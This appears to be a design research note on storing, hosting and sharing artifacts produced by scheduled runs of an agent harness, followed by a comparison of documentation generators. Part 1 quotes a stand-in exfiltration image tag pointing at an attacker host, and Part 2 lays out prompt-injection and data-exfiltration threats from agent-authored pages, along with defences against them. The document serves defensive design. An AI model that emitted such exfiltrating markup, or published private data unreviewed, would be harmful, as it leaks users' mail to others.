# Artifacts, and where they live

Research, 2026-08-05. Raised by the user after the morning-briefing trigger
shipped: *does a scheduled run produce a markdown artifact an agent can read,
and is there a way to see what has been generated?* The answer to both is no —
this is what to build instead, and what the field has already learned.

Two questions are braided together here and want separating early:

1. **Artifacts** — a run produces a report; who can read it, where does it
   live, how is it shared, how is it taken down.
2. **Documentation hosting** — where `docs/` goes when it stops being a
   directory of markdown in a repository. (Part 5.)

They share a word ("static site") and almost nothing else. The hard part of a
documentation site is *generation* — navigation, search, versioning, theming.
The hard part of an artifact site is *lifecycle* — permission, sharing,
revocation, and the fact that the page was written by a language model that
had been reading someone else's email an hour earlier. Picking a documentation
generator to solve the artifact problem would be answering the easy half.

---

## Part 1 — What the field actually does

### Claude Code Artifacts (Anthropic, June 2026)

The closest thing to what was asked for, and worth reading closely because the
constraints are the interesting part. Reported behaviour, from secondary
sources rather than the product docs — treat the details as indicative:

- The agent **writes an HTML or Markdown file into the project, then publishes
  it**. The source file exists in the repository first, so the artifact is a
  *view* of something you still own. That ordering matters: it means the
  artifact is never the only copy.
- Hosted on a `claude.ai` URL. Three visibility tiers: **private by default**,
  **organisation** (Team/Enterprise, viewers sign in, a viewer can be promoted
  to editor), and a **public link** requiring no sign-in.
- **A strict Content Security Policy**: no scripts, styles, or images from
  other hosts, no `fetch` or WebSocket, no backend, no stored form input, no
  multiple routes, and a 16 MiB ceiling.
- **Version history and a gallery**; republishing updates the same URL.
- An artifact that pulls live data through a connector **cannot be shared
  publicly at all**, on any plan.

**Sources disagree on the public-link tier.** Stacktree describes it as
available on paid plans; a comparison piece published by a vendor selling
artifact-sharing software describes Claude's native sharing as org-only with
no public option. The second has an obvious incentive. Anyone depending on
this should check the product directly rather than either blog.

Three of those constraints are load-bearing and generalise:

- **The CSP is the security model, not a polish item.** An agent-authored page
  is untrusted markup: the documented exfiltration pattern is a remote
  subresource — `<img src="https://attacker/?d=…">` — that fires in the
  *viewer's* browser and carries data out in the query string. This is the
  same class as the markdown-image and link-preview exfiltration attacks in
  the literature. Blocking every external request is what makes an
  agent-authored page safe to open, and it has to be enforced by the host,
  because asking the model not to emit such a tag is not enforcement.
- **A connector-backed artifact cannot be public.** Live data and open
  publication are mutually exclusive by construction rather than by warning.
- **No backend, no routes.** A self-contained page is the shape that survives
  being moved somewhere else — which is exactly what makes it portable enough
  to be worth generating in the first place.

### Codex Sites (OpenAI)

Workspace-only: viewable by team members, reportedly Business/Enterprise
preview, no external sharing. The differentiator claimed for it is in-workspace
annotation — comments that land back where the agent can see them.

### Cursor shared canvases

Public browser-accessible links, no account needed for the viewer. One-way
external distribution: no comments, no analytics.

### The third-party layer, and what it tells you

There is a small market of products that exist purely to fill gaps in the
above — anchored comments, viewer analytics, custom domains, feeding viewer
feedback back to the agent, and re-hosting Claude artifacts elsewhere. The
existence of "host your Claude artifact somewhere else" as a product category
is the tell: **the native artifact hosts are all closed loops.** You publish
into the vendor's namespace, under the vendor's identity model, and if you want
a different permission shape you leave.

### What none of them have

Measured against the W3C TAG's *Good Practices for Capability URLs* — the
2014 note that is still the reference for unguessable share links — the whole
field is missing the same three things:

- **Expiry.** A share link that works forever is a credential that never
  rotates.
- **Per-recipient URLs.** Issuing a different capability URL per recipient is
  what makes *targeted* revocation possible; one shared secret can only be
  revoked for everybody.
- **Leak-awareness.** URLs travel in referrers, browser history, chat logs and
  screenshots. The TAG's guidance — unguessable identifiers from a CSPRNG,
  server-side verification, expiry — is cheap to implement and nobody in this
  space does all of it.

That is the whole opportunity for a small self-hosted app, and it is a
genuinely small amount of code.

---

## Part 2 — The finding that matters for mecha

**Publishing an artifact is an outbound send, and mecha already has the
machinery for that.** This is the part not to get wrong.

Three distinct threats, which are easy to collapse into one and shouldn't be:

1. **The publish moves data off the machine.** A briefing distilled from two
   private mailboxes, auto-published to a URL, is exfiltration with good
   typography. The trifecta interlock exists for precisely this: a publish tool
   declares `external_send`, and the interlock refuses it once private and
   untrusted content are both in the conversation. Which, for the morning
   briefing, is *always* — mail reads arm both legs by design.
2. **The page is itself an exfiltration vehicle**, fired in the viewer's
   browser, not the agent's process. Mitigated only by the host's CSP.
3. **The viewer is not the author.** A public artifact containing a summary of
   your inbox is a privacy incident even with no attacker anywhere.

The consequence is a design that costs almost nothing, because it was built
already: **a publish tool is named in `[outbox] tools`.** The agent calls
`artifact_publish`, the loop stages it as a draft, nothing leaves, and
`mecha outbox show` displays exactly what would be published — including the
taint snapshot of the conversation that wrote it, which is already recorded on
every staged item. Release is a human reading the report and saying yes.

That composition also resolves the tension in threat 1 cleanly. Staging
deliberately skips the interlock, because staging sends nothing; so the
briefing *can* draft its own artifact every morning even with the trifecta
armed, and the publication is gated on a person. Exactly the outbox's original
argument, applied to a new sink.

**The read-back problem is separate and simpler.** The briefing's markdown is
currently written by a `notify` shell command to `~/.mecha/briefings/`, which
is outside every path jail, so no agent can read it. The fix is not a new tool
— it is writing the artifact **inside the run's own workspace**, where
`fs_read` already reaches it. Artifacts land where the agent can already go,
rather than punching a hole in the jail. The ledger records the path; the
`/triggers` detail view links it.

---

## Part 3 — Hosting, if the artifact is to be a URL

> **Superseded in part.** `docs/HOSTING-RESEARCH.md` (written alongside this
> one, from the scheduling side) goes considerably deeper on the substrate: the
> Listen/Tunnel/Push-pull posture axis, the credential gradient, the
> origin-isolation hazard when artifacts share a domain with anything that
> holds a session, restricted-SSH deploy keys, and free-tier limits. Treat that
> doc as authoritative for *which box and which origin*; what stays here is
> what is specific to artifacts. The table below is kept because it is scored
> on sharing rather than on posture, which is the axis this doc cares about.
>
> Two of its findings change conclusions here and are worth repeating rather
> than cross-referencing: **GitHub Pages cannot set response headers**, so it
> cannot set the CSP that A3 makes the entire security model — right for
> `docs/`, disqualified for artifacts. And **a tunnel is not the safe option
> it is marketed as**: it still delivers a stranger's request to a process on
> the machine holding the mail tokens, which is the thing that actually
> matters.

Ranked by fit for "private by default, shareable to a named person, public if I
say so, gone when I say so".

| Option | Private sharing | Public | Takedown | Cost | Notes |
|---|---|---|---|---|---|
| **Self-hosted + capability URLs** | unguessable, expiring, per-recipient | flag flip | immediate, yours | a domain | the only one that gets all three; you write it |
| **Cloudflare Pages + Access** | real SSO, named people, free ≤50 users | yes | fast | free tier | no native password; Access is the gate |
| **Netlify** | built-in password protection (paid) | yes | fast | paid for the good bit | simplest managed private |
| **Tailscale Serve** | tailnet members, real identity, never public | no (Serve) / yes (Funnel) | instant | free tier | superb for you, useless for an off-tailnet collaborator |
| **S3 + CloudFront signed URLs** | expiry built in | yes | cache-invalidation lag | pennies | expiry is native, identity is not |
| **GitHub Pages** | none (public repo ⇒ public site) | yes | commit + build | free | right for docs, wrong for artifacts |

Two things fall out.

**Tailscale Serve is the best answer to half the question and no answer to the
other half.** For a DGX behind SSH it is close to ideal — HTTPS, real identity,
nothing exposed to the internet, no reverse proxy. But "share privately with
others" in an academic context usually means a collaborator at another
institution, who is not going to join a tailnet to read a report. Serve for
yourself, capability URLs for them.

**Nothing off the shelf does this.** A search for a self-hosted app that takes
a directory, returns a link, and supports expiry plus password plus revocation
finds static site *generators* and file-sharing tools, not this. The nearest
prior art for the agent-facing half is `deploybase/mcp-server` (Apache 2.0, Go,
MCP tools over a managed hosting service) — which confirms the interface shape
is right and leaves the hosting question exactly where it was.

### The audience split, which is what makes this feel harder than it is

The single most useful structuring move, and it took two documents to see it:
**"read my own agent's output" and "show something to someone else" are
different problems**, and almost every difficulty here comes from trying to
answer both with one origin.

| | Audience | Strangers? | Needs a public box? | Answer |
|---|---|---|---|---|
| **Personal reading** | my own devices | no | no | `tailscale serve <dir>` |
| **External sharing** | a collaborator, a stranger booking a meeting | yes | yes | the public origin in `HOSTING-RESEARCH` |

Solve them separately and each is easy. Solve them together and you inherit
every constraint of the harder one — a public origin, a CSP you must set
yourself, cookie isolation, capability URLs, a box to patch — in order to read
your own briefing in bed.

The posture axis in `HOSTING-RESEARCH` is really two questions, and separating
them is what shows where Serve sits:

1. **Can a stranger send a request at all?**
2. **Does that request reach code we wrote?**

| Shape | Stranger can ask | Reaches our code | Public box to lose |
|---|---|---|---|
| `tailscale serve <dir>` | no | **no** — `tailscaled` serves the bytes | none |
| `tailscale serve <port>` → a mecha server | no | yes | none |
| Push–pull to a VPS | yes | no (at home) | yes |
| Tunnel → home | yes | **yes** | none, and that is the problem |

That is why "P-ish" in the sibling doc's table undersells the static case.
Serving a *directory* over Serve is the only row that answers **no** to both
questions and needs **no second machine at all** — there is no handler to
exploit and no public box to assume lost. It is strictly the cheapest safe
thing on the board, and it is not on the board for external sharing at all.

### Tailscale, checked against the actual machine

Worth its own section because it is the one option already installed here, and
because checking it changed what it is good for.

`tailscale status` on this box shows a tailnet that already spans the DGX
(`spark-8c43`), a MacBook, an iPhone and one more Linux host, all one identity.
So the audience for "read my agent's output on my phone" is *already
authenticated*, with nothing to set up.

**`tailscale serve <target>` takes a file or a directory, not only a port.**
From the CLI's own help on this machine: "`<target>` can be a file, directory,
text, or most commonly the location to a service running on the local machine."
That is the finding that matters, because it removes a whole component:

```text
tailscale serve --bg ~/.mecha/site     # a directory of static files, over HTTPS
```

No web server, no port, no process to supervise, no firewall rule. Whatever
generates the files can be a batch job that exits. `Serve` is tailnet-only;
`Funnel` is the same mechanism pointed at the public internet, and the two are
mutually exclusive per port — which makes "is this public?" a single legible
piece of state rather than a policy spread across a config file.

**If a server is ever wanted, Tailscale can also supply the identity.** When
Serve proxies to a local service it sets `Tailscale-User-Login`,
`Tailscale-User-Name` and `Tailscale-User-Profile-Pic` on the request, and it
*strips* those headers from incoming requests so they cannot be spoofed from
outside. An application behind it therefore knows who is asking without
implementing login, sessions, cookies or password reset — the entire category
of thing that is dangerous to write badly.

The caveat is sharp and is the reason to write this down rather than remember
it: **those headers are only trustworthy if the service listens on loopback
only.** Anything reachable on the LAN or the tailnet directly can be called
without going through Serve, and then the caller supplies whatever identity
they like. Tailscale's own documentation says so, and there is at least one
project bug filed about trusting the header from arbitrary loopback proxies.
So the rule for anything built this way is: bind `127.0.0.1`, refuse to bind
anywhere else without an explicit flag, and treat the header as authoritative
only because of that.

### What a `mecha serve` would actually buy

Asked directly, and worth separating from the hosting question because the
answer is not about hosting at all.

**Reading needs no server.** Yesterday's briefing is a static page; a directory
plus `tailscale serve` covers it completely, and the generator can be a
short-lived process that runs after a trigger and exits.

**A server buys *acting*, and only that.** Releasing an outbox draft from a
phone. Running a trigger now. Disabling one that is misbehaving at 3am from
somewhere that is not a terminal. Given that the interesting scheduled work —
overnight inbox triage — is designed to *stage* replies for review, approving
them from a couch is plausibly the feature that makes the whole 24/7 setup
worth running. That is a real argument for a server, and it is an argument
about the outbox rather than about artifacts.

Three shapes, with what each actually costs:

| Shape | Firewall | Identity | Cost |
|---|---|---|---|
| **Static files + `tailscale serve <dir>`** | untouched | tailnet | none; no process at all |
| **`mecha serve` on loopback + `tailscale serve 8787`** | untouched | tailnet headers | an HTTP server and a route table |
| **Outbound connection to a cloud relay** | untouched | whatever the relay does | a cloud component, and the reports transit a third party |

The third only earns its keep for a viewer who cannot be on the tailnet — which
is the same "external collaborator" case that capability URLs answer more
cheaply, and without a persistent outbound connection from a machine holding
mail credentials.

A middle option worth noting because it costs nothing to keep open: a reverse
proxy already on the box (nginx, Caddy) can front either shape. That matters
mostly as an escape hatch — it means choosing Tailscale now does not foreclose
anything, since every shape here is "serve a directory or proxy a port".

### If it becomes its own repository

The user's instinct is right, with one correction about where the boundary
goes. The reusable thing is **not** a site generator. It is three small pieces:

- **A service.** Takes a bundle of static files, stores it immutably under an
  id, serves it under a policy. Sets the CSP itself and refuses external
  subresources rather than trusting its input. Serves from an **origin
  distinct from anything holding credentials**, so a hostile artifact cannot
  reach an authenticated cookie.
- **A CLI**, so it is usable and testable without an agent anywhere.
- **An MCP server** wrapping the CLI, so *any* agent can publish — mecha,
  Claude Code, anything speaking MCP. Tools declare `openWorldHint` honestly,
  which is what lets a harness like mecha route them through a review gate
  without knowing what the service is.

That layering is the same one `mecha-mail` settled on (library, CLI, thin MCP
binaries) and it is what makes the thing reusable rather than mecha-shaped.

The permission model to implement, in order of value: capability URL with a
CSPRNG id → expiry → revoke-one-link → password → identity. The first three
are most of the value and about a day's work.

---

## Part 4 — Interop: how another agent reads an artifact

Neither this document nor `HOSTING-RESEARCH` had anything to say about the part
of the original idea that makes an artifact store worth extracting into its own
repository: **other agents using it.** Publishing is easy to make portable — it
is an HTTP request. Being *read* is the harder half, and there are two live
standards, one of which mecha cannot currently speak.

**Venue key** (matching `HOSTING-RESEARCH`): ✅ peer-reviewed · 📄 preprint ·
📰 vendor/blog · 📘 spec or standards body · 🔮 folklore.

### 📘 A2A already has an `Artifact` type, and it is close to ours

The Agent2Agent protocol — v1.0 stable in 2026, governed under the Linux
Foundation, the same home MCP moved to in December 2025 — has `Artifact` as a
**first-class object in its Layer 1 data model**, alongside `AgentCard`,
`Task`, `Message` and `Part`. An A2A artifact is defined as an output generated
by an agent as the result of a task, composed of `Part`s — `TextPart`,
`FilePart`, `DataPart`.

That matters for one reason: **there is already a vocabulary for "a thing an
agent produced", and it is not ours.** A store whose data model is
`{id, title, created_at, source, parts[]}` is trivially projectable onto A2A's
`Artifact`; one built around a single markdown blob is not, and the difference
is invisible until the day something else wants to consume it. Adopting the
shape costs nothing now and is the whole difference between a mecha feature and
a component.

The honest caveat: A2A solves agent-to-*agent* task delegation, and nothing in
this design is delegating a task. Aligning the **data model** is cheap and
sensible; implementing the **protocol** would be building a bridge to a river
nobody here is crossing.

### 📰 MCP: reports are Resources, not Tools — and mecha cannot read Resources

The field's guidance for exposing generated files to agents is consistent and
specific: **tools are model-controlled actions; resources are
application-controlled, file-like data.** The failure mode reported repeatedly
is teams defaulting to tools for everything and then discovering context-window
blowups, because a large blob returned from a tool call is spent tokens, where
the same bytes exposed as a resource are read once, deliberately, by the
application. The rule of thumb: if it answers a question it is a Resource; if
it does something it is a Tool.

So an artifact store exposed over MCP should offer **`publish` as a tool**
(it acts, it is `external_send`, it stages through the outbox) and **artifacts
as resources** (they inform).

**And here is the gap, verified in our own source rather than assumed:**
`mecha-core/src/mcp.rs` calls `tools/list` and nothing else, and the
`initialize` handshake declares `"capabilities": {}`. mecha's MCP client is
**tools-only** — it cannot list or read resources at all. So "expose artifacts
as MCP resources" is not a thing mecha could consume today, from its own store
or anyone else's.

Three consequences worth having in writing:

- Exposing artifacts as resources is a **client** work item before it is a
  server one, and it is the kind of prerequisite that is invisible until
  someone tries it and concludes the server is broken.
- Until then the read-back path for mecha's *own* artifacts is the boring one
  that already works and needs no protocol: **write them inside the run's
  workspace**, where `fs_read` reaches them (A1). Cheap, and it does not
  pretend to be interop.
- Resource support in the client is independently worth something — every
  third-party MCP server that exposes resources is currently invisible to
  mecha. That is a gap in the harness, not a detail of this feature. Note the
  security consequence when it is built: a resource's *contents* are
  third-party text exactly as a tool result is, so resources must arrive
  `.from_outside()` and honour the same `[[mcp]] capabilities` override, or
  the interlock acquires a blind spot the day the feature lands.

## Part 5 — Documentation hosting

Separate decision, and one where the field has a clear shape in 2026.

**A note on names:** `astropy` is the Python astronomy library; the web
framework is **Astro**, whose documentation theme is **Starlight**. Assuming
Astro was meant.

| Generator | Speed / scale | Ecosystem | Best for |
|---|---|---|---|
| **Hugo** (Go) | 10k pages in under a minute | large, Go templates | very large sites; speed above all |
| **Zensical** (Python/Rust) | 4–5× faster incremental than MkDocs | new, migrating from Material | Material for MkDocs users |
| **Astro + Starlight** (JS) | fastest of the JS set, islands | growing fast | new open-source docs |
| **Docusaurus** (React) | degrades past ~1000 pages | largest, ~3M weekly | React shops; i18n + versioning together |
| **VitePress** (Vue) | fast | Vue-only | Vue projects, and only those |
| **MkDocs Material** (Python) | fine | 60–70% of Python OSS docs | Python projects |
| **Zola** (Rust) | single binary, fast | thin | Rust projects wanting no new runtime |
| **mdBook** (Rust) | fast | Rust-native | Rust project handbooks |

**Zensical is the live story and deserves the attention it got.** It is from
the Material for MkDocs team (announced 2025-11-05, MIT), and it exists because
**MkDocs itself has been unmaintained since August 2024** and Material has
entered maintenance mode with twelve months of critical-fix support. It reads
an existing `mkdocs.yml`, keeps URLs and structure, and adds a differential
build engine and a new search. The caveat is honest and current: the module
and plugin-parity phases are still landing, with early access gated to paying
"Spark" members, and template overrides need minor MiniJinja adjustments. So:
**the right destination for anyone already on Material for MkDocs, and a bet
on an unfinished road for anyone who is not.**

For `mecha` specifically, the honest answer is that this is a small decision
badly worth over-thinking. `docs/` is ten markdown files with no navigation
structure, no versioning need and no i18n. What actually matters:

- The repository is Rust with no JavaScript toolchain. Docusaurus, Starlight
  and VitePress all mean adopting npm to publish ten markdown files.
- **Zola or mdBook** cost one static binary and nothing else, and mdBook is
  what a Rust reader expects a Rust project's handbook to look like.
- GitHub Pages hosts either for free, and the docs are public anyway.

One line from the survey worth keeping, whatever gets picked: **switching
generators after a year costs roughly ten times what adopting one costs.**
Which argues for choosing on ecosystem fit rather than on today's feature
comparison — and mecha's ecosystem is Rust.

---

## Recommendations

- **A1. Write a trigger's report into its own workspace, not `~/.mecha`.**
  Artifacts become readable by any agent jailed to that workspace, with no
  change to the path jail. Record the path on the ledger row. This is the
  smallest change and it answers the original question.
- **A2. Publishing is a tool, declared `external_send`, named in
  `[outbox] tools`.** No new safety machinery: the outbox stages it, the taint
  snapshot rides along, a human releases it. Do not add an
  auto-publish switch, and specifically do not let a scheduled trigger publish
  publicly without a person in the loop.
- **A3. The host sets the CSP and refuses external subresources.** Not the
  model, not the template. An agent-authored page is untrusted markup, and the
  documented attack fires in the viewer's browser where no interlock reaches.
- **A4. Capability URLs done properly** — CSPRNG id, expiry, one URL per
  recipient so revocation can be targeted, and no secrets in the path that
  will end up in a referrer. Three fields and a check; it is the entire
  difference between this and every native artifact host surveyed.
- **A4b. Generate a directory; let something else serve it.** `tailscale serve
  <dir>` needs no process, no port and no firewall change, and the tailnet here
  is already the exact audience. Any other host — nginx, Caddy, a Pages upload,
  an rsync to a VPS — consumes the same directory, so this choice forecloses
  nothing. A server is a *later, separate* decision, justified by wanting to
  act (release a draft, run a trigger) rather than to read.
- **A4c. If a server is ever built: loopback only, identity from the proxy.**
  Bind `127.0.0.1`, refuse anything else without an explicit flag, and read
  `Tailscale-User-Login` — which is trustworthy *because* of the loopback bind
  and not otherwise. No login, no sessions, no cookies written here.
- **A4d. Model the store on A2A's `Artifact`/`Part` shape** — an id, a title,
  a time, a source, and a list of typed parts. Costs nothing today, and it is
  the difference between a mecha feature and something another agent can
  consume. Do not implement the A2A *protocol*: nothing here delegates a task.
- **A4e. Publish is a Tool; artifacts are Resources** — the MCP split, which
  is about token cost as much as taste. Blocked on mecha's own client, which
  speaks `tools/list` and nothing else; until that changes, the read-back path
  is the workspace (A1), not a protocol.
- **A5. If it becomes a repository: service + CLI + MCP server**, in that
  order, with the site generation being the least interesting part. Serve
  artifacts from an origin that holds no credentials.
- **D1. Docs: Zola or mdBook on GitHub Pages** for mecha, on ecosystem fit —
  no new language runtime for ten markdown files. Zensical if the docs ever
  grow into something Material-shaped, and immediately if they were ever going
  to be MkDocs.

## Deliberately not recommended

- **A docs generator as the artifact engine.** The artifact problem is
  permission and lifecycle; generation is a markdown-to-HTML call and a
  template. Coupling them buys a plugin system nobody needed and a build step
  in the publish path.
- **Auto-publishing anything.** Every failure mode in Part 2 begins with a page
  going up without a person reading it.
- **A second copy of the report as the record.** The session transcript is
  already the record. An artifact is a rendering of it, and when they disagree
  the transcript wins — same rule the `/triggers` detail view already follows.
- **Viewer analytics.** Available in the third-party layer, and it means
  tracking colleagues who opened a report you sent them.
- **Custom domains, comments, multiplayer editing** — all real features in the
  surveyed products, none of them on the path to "my briefing is a page I can
  send someone."

## Sources

- [Claude Code artifacts: publish, plans, private sharing — Stacktree](https://stacktr.ee/blog/artifacts-in-claude-code-explained)
- [Claude Code Artifacts: Ship a Coding Session as a Page](https://www.digitalapplied.com/blog/claude-code-shareable-artifacts-live-web-pages-2026)
- [AI Agent Artifact Sharing Compared: Claude, Cursor, Codex (2026) — Markloop](https://markloop.io/blog/claude-artifact-sharing-compared/)
- [Good Practices for Capability URLs — W3C TAG](https://w3ctag.github.io/capability-urls/)
- [LLM01:2025 Prompt Injection — OWASP GenAI](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)
- [Decoding Latent Attack Surfaces in LLMs: Prompt Injection via HTML in Web Summarization](https://arxiv.org/pdf/2509.05831)
- [Exploiting Web Search Tools of AI Agents for Data Exfiltration](https://arxiv.org/pdf/2510.09093)
- [Zensical — a modern static site generator (Material for MkDocs team)](https://squidfunk.github.io/mkdocs-material/blog/2025/11/05/zensical/)
- [Zensical compatibility and roadmap](https://zensical.org/compatibility/)
- [Static Site Generators 2026 Head-to-Head](https://www.youngju.dev/blog/culture/2026-05-14-static-site-generators-2026-hugo-eleventy-astro-mkdocs-docusaurus-mintlify-starlight-comparison-deep-dive.en)
- [Starlight vs Docusaurus — LogRocket](https://blog.logrocket.com/starlight-vs-docusaurus-building-documentation/)
- [Tailscale Funnel documentation](https://tailscale.com/docs/features/tailscale-funnel)
- [Tailscale Serve documentation](https://tailscale.com/docs/features/tailscale-serve)
- [Tailscale identity — identity headers on proxied requests](https://tailscale.com/docs/concepts/tailscale-identity)
- [Do not trust `Tailscale-User-Login` from arbitrary loopback proxies](https://github.com/denoland/clawpatrol/issues/316)
- [deploybase MCP server (Apache 2.0)](https://codeberg.org/deploybase/mcp-server)
- [Password protection for Cloudflare Pages](https://dev.to/charca/password-protection-for-cloudflare-pages-8ma)
- [Agent2Agent (A2A) Protocol specification](https://a2a-protocol.org/latest/specification/)
- [Announcing the Agent2Agent Protocol — Google Developers Blog](https://developers.googleblog.com/en/a2a-a-new-era-of-agent-interoperability/)
- [MCP Resources vs Tools](https://www.mcpforge.tech/blog/mcp-resources-vs-tools)
- [What Are MCP Resources? (And When to Use Them)](https://apigene.ai/blog/mcp-resources)
